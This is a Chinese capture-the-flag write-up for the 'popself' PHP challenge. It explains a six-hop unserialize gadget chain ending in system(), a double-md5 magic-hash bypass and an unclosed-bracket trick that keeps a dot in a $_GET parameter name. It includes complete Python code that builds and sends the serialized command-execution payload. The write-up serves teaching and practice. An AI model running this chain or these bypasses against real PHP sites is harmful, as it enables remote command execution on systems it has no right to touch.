# 极客大挑战2025 · popself Writeup

| 项 | 内容 |
|---|---|
| 赛事 | 极客大挑战 2025 · SYC 招新赛 |
| 题目 | popself（类名 `All_in_one`） |
| 考点 | 六跳 POP 链 / 双 md5 魔术哈希 / `$_GET` 参数名点号绕过 |
| flag | `SYC{Round_And_r0und_LMAO}`（在环境变量里，所以终点跑 `env`） |
| 状态 | ✅ 已通关 |
| 原始记录 | [logs/2026-10-04.md](../../logs/2026-10-04.md) |

> 相关笔记：[03 · PHP 基础与弱类型绕过](../../notes/03-PHP弱类型绕过.md)（魔术哈希）· [01 · HTTP 基础](../../notes/01-HTTP基础.md)（参数名规范化）

---

## 一句话

> 一条**六跳 POP 链**把「写属性 → 调方法 → 当字符串 → 当函数」四种魔术触发方式串成一条直线：
> `__destruct → __set → __call → __toString → __invoke → system`；
> 起跑前还有一道**双 md5 魔术哈希**门禁，入口又卡在 **`$_GET` 参数名里的点号**上 —— 用**未闭合的方括号** `?24[SYC.zip=` 绕过。

---

## 一、六跳链全景

| 跳 | 触发点 | 代码在干什么 | 我们要喂什么 |
|---|---|---|---|
| ① | `__destruct` | 先过 md5 魔术哈希校验，然后写 `$QYQS->partner = "summer"` | `QYQS` = 下一跳对象 |
| ② | `__set` | 写不存在的属性 → 触发；要求 `$fox() === "summer"` | `Fox` = **数组式 callable** `["summer","find_myself"]` |
| ③ | `__call` | 调不存在的方法 `Eureka()` → 要求 `strlen($L) < 4 && $L + 1 > 10000`，然后 `echo $sleep3r` | `L = "1e4"`；`sleep3r` = `__toString` 载体 |
| ④ | `__toString` | `$a = $this->_4ak5ra; $a();`（**对象当函数调**） | `_4ak5ra` = `__invoke` 载体 |
| ⑤ | `__invoke` | `$f($arg)` | `Samsāra = "system"`、`ivory = 命令` |
| ⑥ | — | **`system(命令)`** | 🚩 终点 |

**链子的一句话**：

> **`__destruct` 开闸 → `__set` 递棒 → `__call` 递棒 → `__toString` 把对象当函数调 → `__invoke` 落地 `system()`。**

### 每一跳怎么想出来的

**和 unsign 是同一套方法**：把那一跳的**关键那一行**抄下来，看它「读哪个 `$this->xxx`、怎么用它」。

| 代码里看到 | 反推 |
|---|---|
| `$obj->属性`（属性不存在） | 需要一个有 `__get` / `__set` 的对象 |
| `$obj->方法()`（方法不存在） | 需要一个有 `__call` 的对象 |
| `echo $obj` / 字符串拼接里出现 `$obj` | 需要一个有 `__toString` 的对象 |
| `$obj()` | 需要一个有 `__invoke` 的对象 |
| `$f($arg)` | `$f` 填**函数名**，`$arg` 填**参数** |

> 本题的「递棒」就是把上面四种形状**首尾相接**：每一跳的载体对象，正好是上一跳要求填进去的那个值。

---

## 二、坑一：双 md5 魔术哈希

```php
md5(md5($KiraKiraAyu)) == md5($K4per)   &&   $KiraKiraAyu !== $K4per
```

要求**两边都是 `0e` 开头的"魔术哈希"**（PHP 弱类型把它们都当 `0`），但**两个原值必须不同**。

| 位置 | 值 | md5 |
|---|---|---|
| `KiraKiraAyu` | **`179122048`** | `md5(md5())` = `0e983430692806892134340492059275` |
| `K4per` | **`240610708`** | `0e462097431906509019562988736854` |

**常用值**（背下来）：

```
240610708      → 0e462097431906509019562988736854
0e215962017    → 0e291242476940776845150308577824
179122048      → 这是上面那个的双层版 md5(md5())
```

> 双层那个（`md5(md5(x))`）**单层表里查不到**，是当天用多进程爆破出来的（**18.6 秒**）。
> 另一对可用的题解值：`f2WfQ` / `0e215962017`。

**⚠️ 每个对象都要设这两个属性** —— 因为它们自己的 `__destruct` 也会跑，不设就 `die`。
这一点在生成器里用 `base()` 统一处理（见 §4.1）。

---

## 三、坑二：`$_GET` 参数名里的点号（PHP 7.3.4）

源码读的是：

```php
$_GET["24_SYC.zip"]
```

但 **PHP 会把参数名里的 `.` 和空格统一替换成 `_`** ——
你发 `?24_SYC.zip=xxx`，PHP 看到的键是 `24_SYC_zip`，**源码永远取不到**。

**绕过：用「未闭合的方括号」**

```
?24[SYC.zip=<payload>
```

| 步骤 | PHP 干了什么 |
|---|---|
| 见到 `[` | 判定为**数组语法**，走数组解析分支 |
| **找不到匹配的 `]`** | 放弃数组，**退化成普通变量名** |
| 收尾时 | 把 `[` 换成 `_`，**却跳过了点号替换** |
| 结果 | 键正好是 **`24_SYC.zip`** ✅ |

> **⚠️ 版本敏感**：PHP **7.3.4 有效**（靶机版本就是它）；**PHP 8.2 已修复**，会老老实实变成 `24_SYC_zip`。
> 这条「未闭合 `[` 跳过参数名规范化」是本次最有价值的知识点之一。

---

## 四、payload

### 4.1 生成器（纯 Python，自己算长度）

不用 PHP 环境，直接手搓序列化串 —— **长度自己算，避免手写 `s:N:` 数错**：

```python
CLS = "All_in_one"

def S(v):                       # 字符串
    b = v.encode("utf-8")
    return b's:' + str(len(b)).encode() + b':"' + b + b'";'

def O(props):                   # 对象
    body = b"".join(S(k) + v for k, v in props)
    return (b'O:' + str(len(CLS)).encode() + b':"' + CLS.encode() + b'":' +
            str(len(props)).encode() + b':{' + body + b'}')

def B(x):                       # 布尔
    return b"b:1;" if x else b"b:0;"

def A(items):                   # 数组
    body = b"".join(b"i:" + str(i).encode() + b";" + v for i, v in enumerate(items))
    return b"a:" + str(len(items)).encode() + b":{" + body + b"}"

def base(**extra):              # 每个对象都必须带那两个魔术哈希值
    props = [("KiraKiraAyu", S(MAGIC_A)), ("K4per", S(MAGIC_B))]
    for k, v in extra.items():
        props.append((k.replace("_DOT_", "."), v))
    return O(props)
```

> **`S()` 用的是 `v.encode("utf-8")` 之后的字节长度，不是字符数。**
> 这题必须这样：属性名 `Samsāra` 里的 `ā` 是 2 字节 → 字符 7 个但 **字节 8 个**，写 `s:7:` 直接挂。

### 4.2 从里往外搭（**和读链子的方向相反**）

读链子是 ①→⑥（起点到终点），但**搭 payload 要 ⑥→①**：先造终点，再一层层往外包。

```python
def build(cmd):
    invoke = base(Samsāra=S("system"), ivory=S(cmd))       # ⑤ 终点：$f($arg)
    tostr  = base(_4ak5ra=invoke)                          # ④ __toString 载体
    call   = base()                                        # ③ __call 载体（只被调用）
    setter = base(Fox=A([S("summer"), S("find_myself")]),  # ② 数组式 callable
                  L=S("1e4"),                              #    1e4+1 = 10001 > 10000
                  komiko=call, sleep3r=tostr)
    return base(QYQS=setter)                               # ① __destruct 载体
```

| 顺序 | 变量 | 它扮演的角色 |
|---|---|---|
| 第 1 个造 | `invoke` | ⑤ `__invoke`：`system(cmd)` 真正执行的地方 |
| 第 2 个造 | `tostr` | ④ `__toString`：把自己「当函数」转交给 `invoke` |
| 第 3 个造 | `call` | ③ `__call`：只是被 `Eureka()` 调用的靶子 |
| 第 4 个造 | `setter` | ② `__set`：一次带齐 `Fox` / `L` / `komiko` / `sleep3r` |
| 第 5 个造 | 最外层 | ① `__destruct`：只装一个 `QYQS` |

> **外层包完，内层对象自动跟着序列化进去** —— 所以只需要 `return` 最外面那一个。
> 这就是「从里往外搭」：先有终点对象，才能把它塞进 `_4ak5ra`；有了 `tostr`，才能把它塞进 `sleep3r`。

### 4.3 发送（**参数名要手写，不能被编码**）

```python
import http.client
from urllib.parse import quote

c = http.client.HTTPConnection(HOST, PORT, timeout=25)
c.request("GET", "/?" + "24[SYC.zip" + "=" + quote(payload, safe=""),
          headers={"Host": HOST, "User-Agent": "Mozilla/5.0"})
body = c.getresponse().read().decode("utf-8", "replace")
print(body.split("</code>")[-1].strip())      # 砍掉 highlight_file 的源码
```

> ⚠️ **不能用 `requests` 的 `params=`** —— 它会把 `[`、`.` 重新编码，`24[SYC.zip` 就变形了。
> 必须用 `http.client` 手拼查询串 + `quote(payload, safe="")`。
>
> **关键区别**：`quote()` 只编 **payload（值）**；`24[SYC.zip` 这个**参数名是手写拼进路径的**，从头到尾没被编码过 —— 这正是绕过能成立的前提。

---

## 五、踩坑

| 问题 | 原因 | 解决 |
|---|---|---|
| **双层魔术哈希查不到** | `md5(md5(x))` 不在通行的单层表里 | 多进程爆破（18.6 s 出 `179122048`） |
| **某个对象没设 `KiraKiraAyu`/`K4per`** | 它自己的 `__destruct` 也会执行 → `die` | ⭐ **每个对象都补上**（`base()` 统一处理） |
| **`$_GET["24_SYC.zip"]` 取不到值** | PHP 把参数名的 `.` 换成 `_` | `?24[SYC.zip=`（**未闭合方括号**）；PHP 7.3.4 有效，8.2 已修 |
| **`requests` 的 `params=` 一用就废** | 它会把参数名/值再编码一次 | 用 `http.client` 手拼查询串 |
| **`"summer::find_myself"()` 报 Fatal error** | 字符串形式的静态调用不能当 callable | 用**数组式** `["summer","find_myself"]` |
| **`L` 填普通短字符串过不了** | 要同时满足 `strlen<4` 且 `+1>10000` | `"1e4"`（长度 3，`1e4+1 = 10001`） |
| **响应里混着源码，判断失误** | `highlight_file` 把源码也回显了 | 只看 `</code>` **之后**的部分 |

---

## 六、可复用方法论

### 6.1 六跳链的搭法：从里往外

| 步骤 | 动作 |
|---|---|
| ① | 从 `__destruct`（或 `__get`）出发，**逐跳抄关键行**，做成 §1 的全景表 |
| ② | 定终点：`$f($arg)` 形状 → `$f` 是函数名（这题终点藏 `env`，所以填 `system` + `env`） |
| ③ | **倒着造对象**：先 `invoke`，再 `tostr`，再 `call`，再 `setter`，最后最外层 |
| ④ | 用 `S()` / `O()` / `A()` 自算长度拼串，**别手写 `s:N:`** |
| ⑤ | 发出去，用 `</code>` 切掉源码再读回显 |

### 6.2 前置校验属性要「每个对象都补齐」

链子跑起来时，**链上每一个对象的 `__destruct` 都会执行**。
只要有一个对象没带上 md5 魔术哈希那对属性，它的 `__destruct` 就先把你 `die` 掉。

→ 做法：写一个 `base()` 包一层，**所有对象都从 `base()` 出**，别单独 `O([...])`。

### 6.3 「参数名里有特殊字符」的两条路

| 情形 | 做法 |
|---|---|
| 参数名含 `.` / 空格 | **未闭合方括号** `?name[with.dot=`（PHP 7.3.4 有效，8.2 已修） |
| 参数名是正常字符，值是复杂串 | 正常发，值用 `quote(v, safe="")` 编码 |
| 任何情况下 | **参数名不要交给 `requests` 自动编码** —— 手拼查询串 |

### 6.4 三条固定习惯

1. **魔术哈希表背下来**（`240610708` / `0e215962017`），双层版本老实爆破。
2. **生成器里长度一律算，不手写**。
3. **回显混源码就 `split("</code>")[-1]`**。

---

## 附录：一句话总结

> **六跳链：`__destruct → __set → __call → __toString → __invoke → system`；读链子从起点往终点，搭 payload 从终点往起点。**
> **起跑门禁是双 md5 魔术哈希（`179122048` / `240610708`），且链上每个对象都要补齐这对属性。**
> **入口用 `?24[SYC.zip=`（未闭合方括号）绕过 PHP 参数名的点号替换 —— 7.3.4 有效，8.2 已修。**
> **发送必须 `http.client` 手拼查询串，`requests` 的 `params=` 会把 `[` 和 `.` 编坏。**
